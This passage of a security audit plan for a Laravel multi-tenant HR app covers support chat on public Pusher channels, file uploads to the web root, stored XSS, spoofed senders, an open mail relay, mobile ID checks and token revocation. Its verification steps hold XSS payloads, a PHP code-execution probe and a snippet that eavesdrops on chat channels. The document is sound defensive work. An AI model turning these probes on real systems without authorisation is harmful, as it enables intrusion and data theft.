- **PDF download** (`downloadGrievanceReportPdf`, `:1085-1118`) is scoped, and `report_pdf.blade.php` has no unescaped output.
- **Web employee lookup / grievance create** check that the employee and witnesses belong to the resort (`:256-322`).
- **All Appeals reads and writes** are resort-scoped (`GrievanceAppealController.php:38-61`, `:330-342`), and hearing participants are validated per resort (`:204-207`). Role checks → S2-06.
- **Mobile API**: `GetEmployeeDetails`, categories, `GrievanceStore` (submitter forced to the logged-in employee; witnesses validated per resort), `myGrievances`, `grievanceDetail`, `respondIdentityDisclosure`, `witnessStatementRequest` are all scoped to the caller's resort **and** their own records.
- **Committee** create / edit / delete and **key-personnel** save validate resort ownership (`ConfigurationController.php:1720-1745`, `:3444+`, `:3538+`). Role checks → S2-06.
- Main grievance list and both investigation pages hide a confidential grievant's name, phone and photo correctly (`$canViewIdentity`).

### Stage 2 — non-security bugs noticed (for Ankit's backlog, not part of this security work)

| File:line | Bug |
|---|---|
| `routes/resort_route.php:1201` | The **delete committee** route points to `GrivanceController@GrivevanceCommitteesDestory`, but that method lives in `ConfigurationController` (`:3538`). Deleting a committee from the UI always fails with a 500. |
| `GrivanceController.php:424-434` | `InvestigationReport()` has no "not found" guard (its sibling `Investigationinfo()` has one at `:800-802`). An unknown or foreign ID gives a 500 instead of a 404. Not a leak, since it crashes before rendering. |
## 4. STAGE 3 — Support module (tickets, email thread, live chat)

**Scope audited:** the whole support feature, both sides, because the original "super-admin support view XSS" turned out to be one part of a bigger chain:
- Resort side: `routes/resort_route.php:1375-1392`, `app/Http/Controllers/Resorts/Support/SupportController.php`, `.../Support/SupportChatController.php`, views `resources/views/resorts/support/*.blade.php`, and the shared chat renderer in `resources/views/resorts/layouts/js.blade.php:557-636`.
- Super-admin side: `routes/admin_route.php:226-254` (behind `auth:admin`), `app/Http/Controllers/Admin/SupportController.php`, `.../Admin/SupportChatController.php`, views `resources/views/admin/support/*.blade.php`.
- Real-time: `app/Events/NewChatMessage.php`, `routes/channels.php`, `routes/web.php:15-20` (`/broadcasting/auth`), `resources/views/partials/pusher-init.blade.php`.
- Email: `app/Mail/SupportReplyEmail.php`, `resources/views/emails/commonEmail.blade.php`.

**Why this matters more than it looks:** the **super-admin** is the one account that can see and manage **every resort**. Any script that runs in the super-admin's browser can do anything the super-admin can, across all tenants. Every XSS path in this stage lands either in the super-admin's browser or in another resort's browser.

---

### S3-01 · CRITICAL · Live support chat runs on public channels — anyone can read every resort's support chats

**Where:**
- `app/Events/NewChatMessage.php:41` — `return new Channel('chat.' . $this->receiverId);`, a **public** Pusher channel. The code comment above it admits it was made public to "sidestep multi-guard auth wiring".
- Listeners: `resources/views/admin/support/chat.blade.php:369` (`Echo.channel('chat.' + <admin id>)`) and `resources/views/resorts/support/chat.blade.php:204` (`Echo.channel('chat.' + <employee id>)`).
- The Pusher **app key is sent to every browser** (`partials/pusher-init.blade.php`). That's normal for Pusher, but it means anyone can connect.

**What an attacker can do (no login needed):**
1. Open any page's HTML to get the Pusher key, then subscribe to `chat.1`, `chat.2`, `chat.3`… (public channels need no authorisation).
2. **Read every live support message, from every resort, in real time**: message text, sender name and photo URL, and attachment names/IDs.
3. `chat.1` is especially valuable: `Resorts/Support/SupportChatController.php:96` sends every **unassigned** ticket's messages to "the first admin" (`Admin::orderBy('id')->first()`). One channel therefore carries unassigned support traffic from **all resorts**.

**A second leak, even without an attacker:** admins listen on `chat.<admin id>` and resort employees on `chat.<employee id>`. Those are **two different ID sequences sharing one channel name**. When a resort user messages admin #5, the message is broadcast on `chat.5`, and **employee #5 of some other resort**, if they have the support chat open, receives it on screen. Admin replies to employee #5 likewise reach admin #5.

**Fix (backend + frontend together):**
1. Make the channel **private and per ticket**: `new PrivateChannel('support-ticket.' . $supportId)`. Pass the ticket id into the event (both `sendMessage` methods know it).
2. In `routes/channels.php`, authorise it for both guards:
   ```php
   Broadcast::channel('support-ticket.{supportId}', function ($user, $supportId) {
       if ($user instanceof \App\Models\Admin) return true; // super-admin panel
       return \App\Models\Support::where('id', $supportId)->where('resort_id', $user->resort_id)->exists();
   }, ['guards' => ['admin', 'resort-admin']]);
   ```
   Check that `/broadcasting/auth` (`routes/web.php:15-20`) resolves the **admin** guard too. Today it only switches to `resort-admin`.
3. Frontend: the `window.Echo` shim in `partials/pusher-init.blade.php` only implements `Echo.channel()` (public). Add `Echo.private()` using Pusher's `authEndpoint: '/broadcasting/auth'` with the CSRF token header, and change both chat views to `Echo.private('support-ticket.' + supportId)`.
4. Remove the `chat.{receiver_id}` channel definition from `routes/channels.php:6-8` once nothing uses it. Grep for other `Echo.channel('chat.` listeners first (invariant #7).

**VERIFY:**
```bash
grep -rn "new Channel('chat\." app/ ; grep -rn "Echo.channel('chat\." resources/views/
```
Expected: *(no output)*
- **Unauthenticated test (required):** in a browser console on any page, with the site logged out, run:
  ```js
  const p = new Pusher('<PUSHER_APP_KEY>', {cluster: '<cluster>'});
  p.subscribe('chat.1').bind('NewChatMessage', e => console.log('LEAK', e));
  p.subscribe('private-support-ticket.1').bind('pusher:subscription_error', e => console.log('BLOCKED', e.status));
  ```
  Then send a support chat message from a resort user on staging. Expected: **no `LEAK` line**, and `BLOCKED 403` (or similar auth failure) for the private channel.
- **Cross-resort test:** logged in as a resort-A user, try `Echo.private('support-ticket.<a resort-B ticket id>')` → subscription error. Same-resort ticket → works, and messages appear live.
- **Both panels still work:** send a message from the resort side, and it appears live in the super-admin chat; reply, and it appears live on the resort side.

---

### S3-02 · CRITICAL (LIKELY — confirm on server) · Support reply attachments: any file type saved into the web root

**Where:** `Resorts/Support/SupportController::sendReply()` — `SupportController.php:400` (validation) and `:407-411` (storage):
```php
'attachments.*'  => 'nullable|file|max:25600',            // no file-type rule
$fileName = time() . '_' . $file->getClientOriginalName();  // predictable name
$filePath = $file->storeAs('support_attachments', $fileName, 'public');
```
The `public` disk is `storage/app/public` (`config/filesystems.php`), served to the web through the `public/storage` symlink (`config/filesystems.php:101-102`). The super-admin view links to it directly: `resources/views/admin/support/view.blade.php:143` (`asset('storage/' . $a)`).

**Why it matters:**
- **Code execution (if the server runs PHP under `public/storage`):** a resort user uploads `shell.php`, and it lands at `/storage/support_attachments/<unix-time>_shell.php`. The name is guessable: the upload time ±a few seconds. If the web server hands any `.php` file under `public/` to PHP (the default nginx/Apache Laravel setup does), the attacker can **run their own code on the server**, meaning every resort's data, the `.env`, everything.
- **Stored XSS on the app's own domain (certain):** an uploaded `.html` or `.svg` opens *on the app's domain* when the super-admin clicks it, the same impact as S3-03.
- Also breaks CLAUDE.md invariant #2: raw `storeAs(..., 'public')` instead of `StorageHelper`. In production (Wasabi) these files don't end up where the rest of the app expects.

**Fix:**
1. Add a file-type allowlist matching the ticket-create form, minus SVG: `'attachments.*' => 'nullable|file|max:25600|mimes:jpg,jpeg,png,gif,webp,heic,heif,pdf,doc,docx,xls,xlsx,csv,txt,mp4,mov'`.
2. Store through `StorageHelper` under a per-resort, per-ticket path with a random name (e.g. `Str::uuid() . '.' . $file->extension()`, keeping the original name only as display metadata), and change `admin/support/view.blade.php:143` to use a `StorageHelper` temporary URL instead of `asset('storage/…')`. Existing rows store `support_attachments/X` paths, so keep a fallback for them.
3. `HUMAN` (server): make sure the web server **never executes PHP inside `public/storage`** (and ideally anywhere except `public/index.php`). nginx example:
   ```nginx
   location ^~ /storage/ { location ~ \.php$ { return 403; } }
   ```
4. `HUMAN`: list what's already in `storage/app/public/support_attachments/` on every server. Any `.php`, `.phtml`, `.phar`, `.html`, `.svg` file there must be reviewed (possible prior compromise) and removed.

**VERIFY:**
```bash
sed -n '/function sendReply/,/^    }/p' app/Http/Controllers/Resorts/Support/SupportController.php | grep -nE "storeAs|'public'|mimes"
```
Expected: no `storeAs`, no `'public'`, and one `mimes:` line.
- `HUMAN` on staging, **before** the fix (to confirm severity): upload a file `rce-test.php` containing `<?php echo "RCE-" . (7*6);` as a support reply attachment, then open `https://<staging>/storage/support_attachments/<its name>`. If the page shows `RCE-42`, it's **confirmed code execution**: escalate immediately and treat production as possibly compromised. After the fix: the upload is **rejected** (422), and a `.php` placed manually under `public/storage` returns `403`, not `RCE-42`.

---

### S3-03 · HIGH · Stored XSS in the support ticket email thread  ·  *Frontend fix (Blade only)*

**Where:**
- **Super-admin ticket view:** `resources/views/admin/support/view.blade.php:130` — `{!! html_entity_decode($msg->message) !!}`
- **Resort ticket view:** `resources/views/resorts/support/email-ticket.blade.php:51` — `{!! html_entity_decode($message->message) !!}`

**How the attack works:** resort replies are saved with `strip_tags($request->message)` (`SupportController.php:420`). `strip_tags` removes `<tags>` but **leaves HTML entities alone**. So a resort user types:
`&lt;img src=x onerror=alert(document.domain)&gt;`
`strip_tags` sees no tags and stores it unchanged. The view then calls `html_entity_decode`, which turns it back into a **real** `<img … onerror=…>`, printed raw with `{!! !!}`. The script runs:
- in the **super-admin's** browser (view.blade.php), giving control of every tenant;
- in the browser of **other staff in the same resort** who open the ticket (email-ticket.blade.php).

(Admin replies are saved with `e($request->body)` at `Admin/SupportController.php` `replyStore`. That's why the view decodes at all: the admin text is stored already escaped.)

**Fix (Blade only — both lines):** decode first, then escape, then keep line breaks:
```blade
{!! nl2br(e(html_entity_decode($msg->message, ENT_QUOTES | ENT_HTML5))) !!}
```
This shows both stored forms (escaped admin text and stripped resort text) correctly as **plain text**, and nothing can turn into live HTML. Apply the same change to `email-ticket.blade.php:51` (`$message->message`). Grep `resources/views/admin/support/` and `resources/views/resorts/support/` for any other `html_entity_decode` / `{!!` on message fields (invariant #7).

**VERIFY:**
```bash
grep -rnE "\{!!\s*html_entity_decode" resources/views/admin/support resources/views/resorts/support
```
Expected: *(no output)*
- `HUMAN` browser test on staging: from a resort user, reply to a ticket with the text `&lt;img src=x onerror=alert('XSS-S3-03')&gt;` and also `<b>bold</b>`. Open the ticket (a) as super-admin (Supports → open the ticket) and (b) as another resort user. **No alert may appear.** The text must show literally. Also confirm an existing admin reply containing an apostrophe or `&` still displays correctly (not as `&amp;#039;`).

---

### S3-04 · HIGH · Stored XSS in the live support chat renderers  ·  *Frontend fix (JavaScript only)*

**Where:** both live-chat renderers build HTML strings from broadcast data:

| File:line | Unescaped value | Who controls it |
|---|---|---|
| `resources/views/admin/support/chat.blade.php:402-404` | `senderImage` inside `src="${senderImage}"`; `senderInitials` (from `senderName`) | the **resort user** (sent as `senderImage` / `senderName` form fields, see S3-05) |
| `resources/views/admin/support/chat.blade.php:424-427` | attachment `filename` | the **resort user** (original upload file name) |
| `resources/views/resorts/layouts/js.blade.php:572-574` | `senderImage`, `senderInitials` | sender |
| `resources/views/resorts/layouts/js.blade.php:596-599` | attachment `filename` | sender |
| `resources/views/resorts/layouts/js.blade.php:615, 629` | **`data.message` itself** (and `senderName` at 611) | sender, **and anyone on the colliding channel** (S3-01) |

Example: a resort user posts the chat form with `senderImage = x" onerror="alert(document.cookie)` → it runs in the **super-admin's** browser the moment the message arrives. On the resort side the message text isn't escaped at all, so a message `<img src=x onerror=…>` runs in the receiving browser. Because of the channel collision in S3-01, that can be a **user in another resort**.

(The message **text** in the admin renderer is already escaped at line 400, and the saved-history rendering in both chat views uses `{{ }}` correctly. Only the live renderers are affected.)

**Fix (JavaScript only):**
1. Add one small escape helper in each file (or a shared one in the resort layout):
   ```js
   function escHtml(s) { return $('<div>').text(s == null ? '' : String(s)).html(); }
   ```
2. Wrap **every** interpolated value: `${escHtml(senderInitials)}`, `${escHtml(filename)}`, `${escHtml(senderName)}`, `${escHtml(data.message)}`. For the resort side, use the same `safeMessage` approach the admin side uses at line 400.
3. For image URLs, don't interpolate into an attribute. Allow only `https:` or same-origin URLs, and set them with jQuery: `$('<img>').attr('src', url)`. For string attachments (`href="${file}"`), allow only `https:` URLs.
4. Grep both files for any remaining `${` inside HTML template strings and check each one.

**VERIFY:**
```bash
grep -nE '\$\{(senderImage|senderInitials|senderName|filename|data\.message)\}' resources/views/admin/support/chat.blade.php resources/views/resorts/layouts/js.blade.php
```
Expected: *(no output)* — every one is wrapped in `escHtml(...)` or built with `.text()` / `.attr()`.
- `HUMAN` browser test on staging, with the super-admin chat for a ticket open in one window: from the resort side, use DevTools to send a chat message with `senderImage` set to `x" onerror="alert('XSS-img')`, `senderName` set to `<img src=x onerror=alert('XSS-name')>`, message `<img src=x onerror=alert('XSS-msg')>`, and an attachment renamed `<img src=x onerror=alert('XSS-file')>.pdf`. **No alert may appear on either side**, and the text shows literally. (After S3-05 the server ignores the sent name and image. The test must still pass.)

---

### S3-05 · HIGH · Chat sender identity is taken from the browser — messages can be faked

**Where:** both `sendMessage` methods accept the sender's identity from the form and store/broadcast it as-is:
- `Resorts/Support/SupportChatController.php:72-79` (validate), `:135-136` (stored as `sender_id`, `sender_type`), `:153-162` (broadcast with `senderName`, `senderImage`)
- `Admin/SupportChatController.php:65-72`, `:119-120`, `:136-145` (same pattern)

**Why it matters:** a resort user can post `senderType=admin`, `senderId=<an admin id>`, `senderName=Support Team`. The saved history then shows a message **"from Support"** telling HR to, for example, "reset your password at this link" or "send us the payroll file". That's a convincing phishing channel **inside** the product. `senderName` / `senderImage` are also what drive the XSS in S3-04.

**Fix:** ignore those four fields from the request and set them on the server:
- Resort side: `sender_id` = the logged-in user's employee id (`$this->resort->getEmployee->id`), `sender_type = 'employee'`, name = the logged-in user's first + last name, image = `Common::getResortUserPicture($this->resort->id)`.
- Admin side: `sender_id` = `Auth::guard('admin')->id()`, `sender_type = 'admin'`, name and image from the admin record.
- Remove `senderId`, `senderType`, `senderName`, `senderImage` from the `validate()` rules. Leave the frontend sending them for now (they'll simply be ignored), or remove them from the `formData.append` calls in both chat views (`admin/support/chat.blade.php:462-469`, `resorts/support/chat.blade.php:256-263`).

**VERIFY:** in tinker (transaction, rolled back), log in as a resort user, call `SupportChatController@sendMessage` with `senderType=admin`, `senderId=1`, `senderName=Support Team`, `senderImage=x` on a ticket of their own resort, then read the created `SupportChatMessage`. `sender_type` must be `employee`, and `sender_id` the caller's employee id. Paste the row. The broadcast payload's `senderName` must be the caller's real name (check via `Event::fake()` + `Event::assertDispatched(NewChatMessage::class, fn($e) => $e->senderName === '<real name>')`).

---

### S3-06 · MEDIUM · Support reply emails any address the user types

**Where:** `Resorts/Support/SupportController::sendReply()`:
- `:394` — `'to_email' => 'required|email'`, taken from the form
- `:431` — `Mail::to($request->to_email)->send(new SupportReplyEmail($ticket, $resort, $request->message, $replyBy))`, which passes the **raw** message (not the stripped one saved at `:420`)
- `app/Mail/SupportReplyEmail.php:75` puts that raw message into the HTML body, printed unescaped by `resources/views/emails/commonEmail.blade.php:5` (`{!! $mainbody !!}`)

**Why it matters:** any portal user can make the company's mail server send an email **to any address in the world**, with their own text, under the product's support branding: a ready-made phishing/spam relay that will hurt the domain's email reputation. (HTML in the message currently breaks the send by accident: `SupportReplyEmail.php:46` looks up the saved message by the raw text, which no longer matches after `strip_tags`, so it crashes on null and the error is swallowed. **Plain-text** phishing with a link goes through today.)

**Fix:**
1. Don't read `to_email` from the request. Send to the configured support address (`Settings::first()->support_email`, which `replyEMail()` already loads at `SupportController.php:385-386`) and/or the assigned admin's email. Remove the field from the form (`resources/views/resorts/support/email-reply.blade.php`) or make it display-only.
2. Pass the **stored** (stripped) message to `SupportReplyEmail`, and in `SupportReplyEmail.php:75` escape it: `nl2br(e($this->replyMessage))`. Fix the lookup at `:46` to use the message id instead of matching text.

**VERIFY:**
```bash
grep -nE "to_email" app/Http/Controllers/Resorts/Support/SupportController.php
```
Expected: *(no output)*, or only a line that is **not** used as the `Mail::to()` target.
- In tinker with `Mail::fake()` (transaction, rolled back): call `sendReply` with `to_email=attacker@example.com` → `Mail::assertNotSent(SupportReplyEmail::class, fn($m) => $m->hasTo('attacker@example.com'))`, and `assertSent` to the configured support address. Paste the output.

---

### S3-07 · LOW · Upload type gaps + a raw name column

| Where | Issue | Fix |
|---|---|---|
| `Resorts/Support/SupportController.php:235` (ticket create) | Allows **`svg`**, which can contain script. | Remove `svg` from the list. |
| `Resorts/Support/SupportChatController.php:81`, `Admin/SupportChatController.php:74` (chat) | No file-type rule at all (`nullable|file|max:51200`). | Add the same `mimes:` allowlist as S3-02 step 1. |
| `Resorts/Support/SupportChatController.php:115` | Chat attachments are stored in the **sender's personal employee folder** (`AWSEmployeeFileUpload(..., $employee->Emp_id, null, true)`), mixed with their personal documents. | Store under a support-ticket folder instead. Coordinate with S2-05c (same pattern) and S2-07 (same "secure" encryption). |
| `Admin/SupportController.php:93, 221` | `employee_name` column built from names and listed in `rawColumns`. Low risk while names are HR-controlled. | Wrap the name parts in `e()`. |

**VERIFY:** `grep -nE "svg" app/Http/Controllers/Resorts/Support/SupportController.php` → no output. Both chat `attachments.*` rules contain `mimes:`. Uploading `test.svg` to a ticket and `test.html` to chat → both rejected (422).

---

### Stage 3 — checked and found clean

- Ticket **list, view, email page, reply** and chat **page / fetch / send** on the resort side are all scoped to the user's resort (`SupportController.php:41-200, 360-400`; `SupportChatController.php:33, 49, 71`). No cross-resort access **through the controllers**; the cross-resort leak is only through the broadcast channel (S3-01).
- **Saved chat history** on both sides is escaped (`{{ $msg->message }}`, `{{ $attachment['Filename'] }}`).
- Ticket **subject and description** are escaped in the super-admin view (`view.blade.php:36, 71`).
- The super-admin routes are all behind `auth:admin` (`routes/admin_route.php:15`).
- In the super-admin live chat, the **message text** itself is escaped (`admin/support/chat.blade.php:400`). Only the name, photo and file-name fields aren't (S3-04).
### X-02 · HIGH · Mobile app: acting on, or viewing, any employee by changing an ID

**How this was found:** a scan of **every** mobile API method (`app/Http/Controllers/API/*.php`) for request fields naming an employee (`emp_id`, `employee_id`, `employee_ids`, `user_id`, …). Each hit was mapped to the route's rank guard (`routes/api.php` groups: `check.rank:*`, `security.manager`, `clinic.manager`) and to the method's own checks. 16 methods take an employee ID from the request; **11 are correctly guarded** (see the clean list below). These **5 aren't**:

| # | Endpoint (`routes/api.php`) | Method | Who can call it | What's wrong |
|---|---|---|---|---|
| a | `POST monthlycheckin/monthly-checkin-store` (`:469`) | `MonthlyCheckInController::monthlyCheckInStore` (`:218`) | **any** logged-in employee (no rank guard) | `emp_id` is only `'required'` (`:232`). Creates a monthly check-in record and a learning request **about any employee of any resort** (`:249-276`), looks them up with bare `Employee::find()` (`:287`), and **pushes a notification to their phone** (`:313`). |
| b | `POST …/housekeeping-assign-hod-to-emp` (`:188`, `check.rank:HOD,EXCOM`) | `AccommodationController::houseKeepingAssingHODtoEmp` (`:2020`) | HOD / EXCOM of any resort | `HousekeepingSchedules::where("id", $request->housekeeping_id)->update(['Assigned_To' => $request->emp_id])` (`:2047`): **no resort check** on the schedule (cross-resort write), and `emp_id` is only `'required'` (`:2027`), so any employee anywhere can be assigned and notified (`:2077`). |
| c | `SOPassAssign` (`:270`, `security.manager`) | `BoardingPassController::SOPassAssign` (`:1940`) | a resort's security manager | `employee_ids` is only `required|array` (`:1949`). Travel-pass assignments are created for, and notifications pushed to, **employees of other resorts**. |
| d | `manifestSOAssign` (`:271`, `security.manager`) | `BoardingPassController::manifestSOAssign` (`:2020`) | a resort's security manager | Same: `employee_ids` only `required|array` (`:2031`). The manifest and passes are scoped, but the **employees aren't**. |
| e | `POST timeandattendance/get-employee-month-data-preview` (`:308`) | `TimeAndAttendanceController::getEmployeeMonthDataPreviewList` (`:4112`) | **any** logged-in employee | Scoped to the caller's resort (`:4154`), but there's **no check that the caller is that employee or their manager**. Any employee can read **any colleague's** month of attendance, overtime and leave (including leave types such as sick leave). |

**Fix:**
- **a:** the check-in is meant to be done by the employee's manager. Require that the caller is HR, or the `reporting_to` manager / HOD of `emp_id`'s department, and validate `emp_id` with `Rule::exists('employees','id')->where('resort_id', $this->resort_id)`. Replace the bare `find()` with a resort-scoped lookup.
- **b:** scope the schedule (`HousekeepingSchedules::where('resort_id', $this->resort_id)->where('id', …)`, 404 if missing), validate `emp_id` against the resort, and (per W-style department rules) against the HOD's own department.
- **c, d:** `'employee_ids.*' => ['integer', Rule::exists('employees','id')->where('resort_id', $this->resort_id)]`.
- **e:** allow only when the caller **is** `employee_id`, **or** is HR/GM, **or** is the HOD/manager of that employee's department (reuse the pattern `hodMarkAttendancePresent` already uses at `TimeAndAttendanceController.php:3170-3180`). Otherwise `403`.
- Going forward, every module sweep checks criterion 5 (§7 intro) for **both** mobile and web endpoints.

**VERIFY:** with mobile tokens for (1) an ordinary employee of resort A and (2) a HOD / security manager of resort A:
- a: (1) posts a check-in with `emp_id` = a resort-B employee → `422`/`403`, no `monthly_checkings` row, no notification. (1) with a resort-A colleague they don't manage → `403`.
- b: (2) with a resort-B `housekeeping_id` → `404`, schedule unchanged. With a resort-B `emp_id` → `422`.
- c, d: (2) with `employee_ids` containing a resort-B employee → `422`, no `employee_travel_pass_assigns` row.
- e: (1) with a colleague's `employee_id` → `403`; with their **own** id → `200`; (2) as that colleague's HOD → `200`.
Paste all results.

**Checked and found clean (mobile, criterion 5):** `assignAccommodationToEmp`, `moveAccommodationForEmp` (resort-scoped, HR/GM/HOD/EXCOM only); `treatmentAdd`, `medicalCertificateStore` (clinic staff only, resort-scoped); `createRequest` (housekeeping, rank-guarded, scoped); `hodViewDutyRoster` (scoped); `hodMarkAttendancePresent` (resort **and** HOD's department, `:3170-3180`); `manifestStore` (checks role in the method, `:1622`); Grievance `GetEmployeeDetails` (resort-scoped lookup); every self-service endpoint in Payroll, Grievance and salary advance (always uses the logged-in employee's own ID).

---

### X-03 · MEDIUM · Super-admin "log in as resort user" (impersonation)  ·  ⏸ DEFERRED

> **⏸ DEFERRED by the product owner (2026-09-26):** the super-admin panel is still being tested. **Claude Code: do NOT work on X-03 now.** It stays on the list and **must be resolved before production go-live**. Re-check it in the final pre-production gate (§0.4).

**Where:** `app/Http/Controllers/Admin/LoginController::AdminToResort()` (`:110-168`), route `POST /admin/admin-to-resort` (`routes/admin_route.php:22`).

**What it does:** the super-admin panel can log straight into a resort's portal as a resort user, for support. That's a legitimate feature, but:
1. **Any admin-panel account can use it.** The route is inside `auth:admin` but **before** the `hasModuleAccess` group (`routes/admin_route.php:29`) that limits what other admin accounts can do. A limited support account can become any resort's user.
2. **It picks whichever resort user is first in the table** (`ResortAdmin::where('resort_id', $resort_id)->first()`, `:115`), not a chosen or dedicated support identity, so the admin acts with that person's full rights.
3. **No audit trail.** It stores `session(['impersonated_by' => Auth::id()])` (`:136`), but `Auth::id()` reads the **default `web` guard** (`config/auth.php:17`), not the `admin` guard, so the value is **always empty**. Nothing records which admin logged in as which resort user, or when. Everything done during the session looks like the resort user did it.
4. **"End impersonation" is broken.** `routes/admin_route.php:23` points to `LoginController@endImpersonation`, **which doesn't exist**, so there's no clean way back and the resort session just stays open.

**Why it matters for the international client:** their auditors will ask "can your vendor log into our HR system as our staff, and is it recorded?" Today the answer is "yes, and no".

**Fix:**
1. Move the route inside the `hasModuleAccess` group, or add an explicit check that only full super-admins (not limited admin accounts) can impersonate.
2. Record every impersonation in a new `impersonation_logs` table (**migration**): admin id (`Auth::guard('admin')->id()`), resort id, resort user id, start and end time, IP. Also fix the session value to use `Auth::guard('admin')->id()`.
3. Let the admin **choose** which resort user to log in as (or use a dedicated, clearly named support account per resort) instead of "the first row".
4. Implement `endImpersonation()`: log out the `resort-admin` guard, close the log row, redirect back to the admin panel. Show a visible "You are impersonating X — End" banner in the resort portal while `impersonated_by` is set.
5. `HUMAN`: decide whether resorts (especially the international client) should be able to **opt out** of impersonation, or be notified when it happens.

**VERIFY:** as a limited admin account (no module access) → `POST /admin/admin-to-resort` → `403`. As a super-admin → works, and a row exists in `impersonation_logs` with the real admin id. The banner shows. "End" returns to the admin panel and the log row gets an end time. `grep -n "Auth::id()" app/Http/Controllers/Admin/LoginController.php` → no output.

---

## 5. STAGE 4 — Mobile login tokens & account lifecycle

**Scope audited:** mobile login and logout (`app/Http/Controllers/API/LoginController.php`), password change (`app/Http/Controllers/API/ProfileController.php`), the `api` guard (`config/auth.php:43-47`, driver `passport`, Passport `v13.8.0`), the mobile route middleware (`routes/api.php`), every place an employee is deactivated, and the web-portal login (`app/Http/Controllers/Resorts/ResortLoginController.php`) for comparison.

**Correction to an earlier chat claim:** tokens were described as "never expire". They **do** expire, after **one year**, Passport's default (`vendor/laravel/passport/src/Passport.php:296, 324`; nothing in the app overrides it). The real problems are that tokens **aren't cut off when they should be** (S4-01 to S4-03).

**Already done well (don't redo):** login is rate-limited, compares passwords in constant time, caps each account at 5 live tokens and revokes the oldest (`LoginController.php:105-115`, `MAX_ACTIVE_TOKENS = 5` at `:30`); logout revokes the token (`:162-168`); every "forgot password" reset deletes **all** of that user's tokens (`Resorts/ResortforgotPasswordController.php:107` and the admin/shopkeeper equivalents).

---

### S4-01 · HIGH · People who leave or are deactivated keep full mobile access

**What it is:** when an employee is deactivated or leaves, **nothing revokes their mobile tokens**, and **nothing checks their status on later requests**. Their app keeps working for up to a year. If they were HR, a HOD or GM, that includes approving leave, seeing their team's data, and everything else their role allows.

**Where employees are deactivated, none of which touch tokens:**

| File:line | Path |
|---|---|
| `app/Http/Controllers/Resorts/People/Employee/EmployeeController.php:2913` | HR sets employee `Inactive` |
| `app/Http/Controllers/Resorts/People/Employee/EmployeeController.php:2933` | HR sets employee `Inactive` (second path) |
| `app/Http/Controllers/Resorts/People/ExitClearance/ExitClearanceController.php:1185` | exit clearance completed → `Terminated` |
| `app/Console/Commands/ApplyEmployeeLastWorkingDay.php:46` | nightly job: last working day passed → `Inactive` |
| `app/Http/Controllers/Admin/ResortsController.php:323, 568` | super-admin sets a resort admin account `inactive` |

**No per-request check:** the mobile routes use only `auth:api` (+ `applyResortSmtp`, and `check.rank:*` on some groups, `routes/api.php:24, 158+`). `CheckUserRankForAPI` checks rank, not status. Nothing re-checks `employees.status`, `resort_admins.status` or `resorts.status` after login.

(Web portal: a deactivated user's **existing browser session** also keeps working until it idles out (30 minutes, `config/session.php:34`), because `resort_route.php:62` middleware doesn't check status either. Lower risk than a year-long mobile token, but fix it the same way.)

**Fix (both parts are needed: part 1 cuts off the obvious paths, part 2 catches every path, including ones added later):**
1. **Revoke on deactivation.** Add one helper in `Common.php`, e.g. `Common::revokeAllApiTokens(ResortAdmin $admin)` → `$admin->tokens()->update(['revoked' => true]);`, and call it at every row in the table above, right after the status change is saved (for employees, via `$employee->resortAdmin` / `Admin_Parent_id`). Wrap it in try/catch so a revoke failure never rolls back the HR action. **Invariant #7:** grep for any other place that sets `employees.status` or `resort_admins.status` (`grep -rnE "status'?\s*(=>|=)\s*['\"](Inactive|inactive|Terminated|Resigned|Suspended)['\"]" app`) and cover those too.
2. **Check status on every mobile request.** Add a small middleware (e.g. `EnsureAccountActive`) to the `auth:api` group at `routes/api.php:24`. It rejects with `401` when the employee, the resort-admin account, or the **resort** isn't allowed (use the same allow-list as S4-02), and revokes the token it was called with. Add the same check to the web-portal group at `resort_route.php:62` (log out + redirect to login).

**VERIFY:**
- Tinker (transaction, rolled back): take an active employee with a live token (`$admin->tokens()->where('revoked', false)->count() > 0`), run the **real** deactivation code path (e.g. call the controller method at `EmployeeController.php:2913` with the harness pattern from §0.5), then `$admin->tokens()->where('revoked', false)->count()` → `0`. Repeat for the exit-clearance path and the `ApplyEmployeeLastWorkingDay` command. Paste all three results.
- Middleware: with a token for an employee, set their status to `Terminated` **inside a transaction**, make an authenticated request through the HTTP kernel (e.g. `$this->withToken($t)->getJson('/api/...')` in a PHPUnit test using `DatabaseTransactions`, or `app()->handle(Request::create(...))` in tinker) → `401`. Set it back to `Active` → `200`.
- `HUMAN` on staging with a real phone: log in on the app, have HR deactivate that employee in the portal, pull to refresh in the app → it must log out or show "account deactivated" **immediately**, not after a year.

---

### S4-02 · HIGH · Login status checks are wrong

**Where:** `API/LoginController.php` `apiLogin()`, status checks right after the password check (`:71` employee, `:90` resort-admin), and `Resorts/ResortLoginController.php:73-99` for the web portal.

**Confirmed problems:**
1. **Block-list instead of allow-list.** The mobile login only blocks `employees.status == "Inactive"`. The status column (`database/migrations/2026_05_28_120000_add_offboarding_to_employees_status_enum.php:26-30`) also has `Terminated`, `Resigned`, `Suspended` (plus `Active`, `On Leave`, `Onboarding`, `Offboarding`). **A `Terminated`, `Resigned` or `Suspended` employee can log in to the mobile app.** Exit clearance sets exactly `Terminated` (`ExitClearanceController.php:1185`). The web portal has the same gap (`ResortLoginController.php:91` checks only `=== 'Inactive'`).
2. **Wrong case, so the check never matches.** The mobile login checks `$resortAdmin->status == "Inactive"` (capital I, `:90`). The super-admin form saves `resort_admins.status` as lowercase `active` / `inactive` (`resources/views/admin/resorts/edit.blade.php:766-767`, saved at `Admin/ResortsController.php:323, 568`), and the web login correctly checks lowercase `'inactive'` (`ResortLoginController.php:82, 99`). PHP string comparison is case-sensitive, so **a resort-admin account the super-admin has deactivated can still log in to the mobile app.**
3. **Deactivated resort not checked on mobile.** The web login blocks users of a resort whose `resorts.status` is `inactive` (`ResortLoginController.php:73`). The mobile login has **no resort check at all**. When a client resort is switched off (contract ended), its staff can still use the mobile app.

**Fix:**
1. Put one allow-list in `Common.php` (or on the `Employee` model): `Employee::LOGIN_ALLOWED_STATUSES = ['Active', 'On Leave', 'Onboarding', 'Offboarding']`.
   **✅ DECIDED by the product owner (2026-09-26):** employees who are `On Leave`, `Onboarding` or `Offboarding` (working their notice) **keep** app access. Access must end **immediately** when an employee is marked `Inactive`, `Terminated`, `Resigned` or `Suspended`. "Immediately" means S4-01 (revoke tokens at the moment the status changes, plus the per-request middleware) is required, not optional. Blocking only at the next login isn't enough. Any **new** status added to the enum later is **blocked by default** until it's added to this allow-list on purpose.
2. Use it in **both** logins and in the S4-01 middleware.
3. Compare `resort_admins.status` and `resorts.status` **case-insensitively** (`strtolower($x) === 'inactive'`, or better, allow only `strtolower($x) === 'active'`).
